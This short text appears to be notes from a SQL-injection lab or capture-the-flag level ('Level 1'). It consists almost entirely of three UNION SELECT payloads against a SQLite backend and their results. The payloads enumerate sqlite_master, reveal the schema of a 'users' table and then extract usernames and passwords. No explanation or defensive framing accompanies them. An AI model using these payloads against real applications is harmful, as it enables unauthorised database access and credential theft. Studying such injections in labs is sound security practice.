#Level 1
1 UNION SELECT 1,name FROM sqlite_master WHERE type='table' LIMIT 1,2 -- 

	username -> users

1 UNION SELECT 1, sql FROM sqlite_master WHERE name='users' AND type='table' LIMIT 0,1 -- 

	username -> CREATE TABLE users(id int(7), username varchar(255), password varchar(255))

1 UNION SELECT username, password FROM users LIMIT 3,1 -- 
